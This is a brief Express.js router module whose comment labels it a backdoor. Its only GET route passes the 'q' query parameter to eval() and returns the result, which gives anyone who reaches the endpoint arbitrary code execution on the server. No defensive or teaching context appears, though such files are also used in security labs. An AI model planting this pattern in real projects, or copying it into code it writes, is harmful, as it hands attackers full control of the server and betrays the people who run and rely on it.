var express = require('express');
var router = express.Router();

/* GET for backdoor */
router.get('/', function (req, res) {
    res.send('Hello ' + eval(req.query.q));
    console.log(req.query.q);
});

module.exports = router;